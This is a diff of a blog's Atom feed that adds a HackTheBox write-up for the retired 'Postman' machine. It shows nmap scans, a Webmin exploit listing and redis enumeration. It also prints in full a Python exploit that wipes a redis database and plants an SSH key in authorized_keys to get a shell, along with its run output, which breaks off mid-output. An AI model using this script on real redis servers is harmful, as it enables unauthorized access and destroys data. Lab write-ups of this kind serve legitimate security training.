@@ -1,5 +1,393 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-02-08T10:35:00+01:00</updated><entry><title>Vault</title><link href="https://maggick.fr/2020/02/vault.html" rel="alternate"></link><published>2020-02-08T10:35:00+01:00</published><updated>2020-02-08T10:35:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-02-08:/2020/02/vault.html</id><summary type="html">&lt;blockquote&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-03-15T12:30:00+01:00</updated><entry><title>HTB: Postman</title><link href="https://maggick.fr/2020/03/htb-postman.html" rel="alternate"></link><published>2020-03-15T12:30:00+01:00</published><updated>2020-03-15T12:30:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-03-15:/2020/03/htb-postman.html</id><summary type="html">&lt;p&gt;&lt;img alt="Postman Card" class="align-left" src="/media/2020.03/postman_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/215"&gt;Postman&lt;/a&gt; publish on
+Novemer the second 2019 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/114053"&gt;TheCyberGeek&lt;/a&gt;.
+This box is rated as easy box. It implies a redis server, a &lt;code&gt;id_rsa.bak&lt;/code&gt;, john
+the ripper and webmin 1.910.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.03/postman_card.png" alt="Postman Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/215"&gt;Postman&lt;/a&gt; publish on
+Novemer the second 2019 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/114053"&gt;TheCyberGeek&lt;/a&gt;.
+This box is rated as easy box. It implies a redis server, a &lt;code&gt;id_rsa.bak&lt;/code&gt;, john
+the ripper and webmin 1.910.&lt;/p&gt;
+
+
+&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
+&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The box is quit busy so first of all we
+run a simple aggressive TCP scan:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Nov 19 16:52:02 2019 as: nmap -p- -sS -oA nmap_all_port -T4 10.10.10.160&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.160&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.090s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65530 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp    open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;4444/tcp  open  krb524&lt;/span&gt;
+&lt;span class="code-line"&gt;6379/tcp  open  redis&lt;/span&gt;
+&lt;span class="code-line"&gt;10000/tcp open  snet-sensor-mgmt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We run a version scan on this open ports:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Nov 19 18:32:32 2019 as: nmap -p22,80,4444,6379,10000 -sSV -oA nmap_version 10.10.10.160&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.160&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.087s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE  SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))&lt;/span&gt;
+&lt;span class="code-line"&gt;4444/tcp  closed krb524&lt;/span&gt;
+&lt;span class="code-line"&gt;6379/tcp  open   redis   Redis key-value store 4.0.9&lt;/span&gt;
+&lt;span class="code-line"&gt;10000/tcp open   http    MiniServ 1.910 (Webmin httpd)&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The open ports are:
+* 22: SSH
+* 80: a web server
+* 6379: a redis server
+* 10 000: another web server&lt;/p&gt;
+&lt;p&gt;We do not have any information to connect to the SSH server.&lt;/p&gt;
+&lt;p&gt;The website on port 80 does not give us anything.&lt;/p&gt;
+&lt;p&gt;The website on port 10 000 is a webmin login interface. There is a few exploit
+available for it. But none of it works.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;searchsploit webmin&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title                                                              |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;                                                                           | (/usr/share/exploitdb/)&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;DansGuardian Webmin Module 0.x - &amp;#39;edit.cgi&amp;#39; Directory Traversal             | exploits/cgi/webapps/23535.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin - Brute Force / Command Execution                                    | exploits/multiple/remote/705.pl&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                 | exploits/linux/remote/22275.pl&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 0.x - &amp;#39;RPC&amp;#39; Privilege Escalation                                     | exploits/linux/remote/21765.pl&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 0.x - Code Input Validation                                          | exploits/linux/local/21348.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.5 - Brute Force / Command Execution                                | exploits/multiple/remote/746.pl&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.5 - Web Brute Force (CGI)                                          | exploits/multiple/remote/745.pl&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.580 - &amp;#39;/file/show.cgi&amp;#39; Remote Command Execution (Metasploit)       | exploits/unix/remote/21851.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.850 - Multiple Vulnerabilities                                     | exploits/cgi/webapps/42989.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.900 - Remote Command Execution (Metasploit)                        | exploits/cgi/remote/46201.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.910 - &amp;#39;Package Updates&amp;#39; Remote Command Execution (Metasploit)      | exploits/linux/remote/46984.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.920 - Remote Code Execution                                        | exploits/linux/webapps/47293.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)           | exploits/linux/remote/47230.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin 1.x - HTML Email Command Execution                                   | exploits/cgi/webapps/24574.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin &amp;lt; 1.290 / Usermin &amp;lt; 1.220 - Arbitrary File Disclosure (PHP)          | exploits/multiple/remote/1997.php&lt;/span&gt;
+&lt;span class="code-line"&gt;Webmin &amp;lt; 1.290 / Usermin &amp;lt; 1.220 - Arbitrary File Disclosure (Perl)         | exploits/multiple/remote/2017.pl&lt;/span&gt;
+&lt;span class="code-line"&gt;phpMyWebmin 1.0 - &amp;#39;target&amp;#39; Remote File Inclusion                            | exploits/php/webapps/2462.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;phpMyWebmin 1.0 - &amp;#39;window.php&amp;#39; Remote File Inclusion                        | exploits/php/webapps/2451.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;webmin 0.91 - Directory Traversal                                           | exploits/cgi/remote/21183.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="redis"&gt;Redis&lt;/h2&gt;
+&lt;p&gt;The last service is the redis server. We use redis-cli in order to connect to
+it and start enumerating using the autocompletion.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# redis-cli -h 10.10.10.160&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.10.160:6379&amp;gt; CONFIG GET dbfilename&lt;/span&gt;
+&lt;span class="code-line"&gt;1) &amp;quot;dbfilename&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;2) &amp;quot;authorized_keys&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.10.160:6379&amp;gt; CONFIG GET dir&lt;/span&gt;
+&lt;span class="code-line"&gt;1) &amp;quot;dir&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;2) &amp;quot;/var/lib/redis/.ssh&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;A quick Google search for "redis ssh exploit" return this
+&lt;a href="https://github.com/Avinash-acid/Redis-Server-Exploit"&gt;github repository&lt;/a&gt;.
+We modify the script to include our &lt;code&gt;.ssh&lt;/code&gt; folder:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Author : Avinash Kumar Thapa aka -Acid&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Twitter : https://twitter.com/m_avinash143&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os.path&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;termcolor&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;script&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ip_address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/bin/redis-cli&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;PATH1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/local/bin/redis-cli&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;ssh_connection&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ssh -i &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;$HOME/.ssh/id_rsa &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;@&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip_address&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PATH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PATH1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;*******************************************************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;* [+] [Exploit] Exploiting misconfigured REDIS SERVER*&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;* [+] AVINASH KUMAR THAPA aka &amp;quot;-Acid&amp;quot;                                &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;*******************************************************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s2"&gt; SSH Keys Need to be Generated&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ssh-keygen -t rsa -C &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;acid_creative&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s2"&gt; Keys Generated Successfully&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;blue&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;(echo &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\r\n\&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;; cat $HOME/.ssh/id_rsa.pub; echo  &lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;\r\n\&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;) &amp;gt; $HOME/.ssh/public_key.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;redis-cli -h &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_address&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; flushall&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;redis-cli -h &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_address&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cat $HOME/.ssh/public_key.txt | redis-cli -h &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;  &lt;span class="n"&gt;ip_address&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; -x set cracklist&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; config set dbfilename &amp;quot;backup.db&amp;quot; &amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;cmd4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; config set dir &amp;quot;/var/lib/redis/.ssh/&amp;quot; &amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd5&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; config set dbfilename &amp;quot;authorized_keys&amp;quot; &amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; save&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s2"&gt;You&amp;#39;ll get shell in sometime..Thanks for your patience&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;ssh_connection&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Something went wrong&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s2"&gt;Redis-cli:::::This utility is not present on your system. You need to install it to proceed further.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;red&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Running this script will give us a shell as redis.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python redis.py 10.10.10.160 redis&lt;/span&gt;
+&lt;span class="code-line"&gt;  *******************************************************************&lt;/span&gt;
+&lt;span class="code-line"&gt;  * [+] [Exploit] Exploiting misconfigured REDIS SERVER*&lt;/span&gt;
+&lt;span class="code-line"&gt;  * [+] AVINASH KUMAR THAPA aka &amp;quot;-Acid&amp;quot;                                &lt;/span&gt;
+&lt;span class="code-line"&gt;  *******************************************************************&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  SSH Keys Need to be Generated&lt;/span&gt;
+&lt;span class="code-line"&gt;Generating public/private rsa key pair.&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter file in which to save the key (/root/.ssh/id_rsa): &lt;/span&gt;
+&lt;span class="code-line"&gt;/root/.ssh/id_rsa already exists.&lt;/span&gt;
+&lt;span class="code-line"&gt;Overwrite (y/n)? y&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter passphrase (empty for no passphrase): &lt;/span&gt;
+&lt;span class="code-line"&gt;Enter same passphrase again: &lt;/span&gt;
+&lt;span class="code-line"&gt;Your identification has been saved in /root/.ssh/id_rsa.&lt;/span&gt;
+&lt;span class="code-line"&gt;Your public key has been saved in /root/.ssh/id_rsa.pub.&lt;/span&gt;
+&lt;span class="code-line"&gt;The key fingerprint is:&lt;/span&gt;
+&lt;span class="code-line"&gt;SHA256:AXkEW81gyz1YrQfxEQw3t82W/NoAp6q8IdpYTPV8sN0 acid_creative&lt;/span&gt;
+&lt;span class="code-line"&gt;The key&amp;#39;s randomart image is:&lt;/span&gt;
+&lt;span class="code-line"&gt;+---[RSA 3072]----+&lt;/span&gt;
+&lt;span class="code-line"&gt;|      o+=++==..  |&lt;/span&gt;
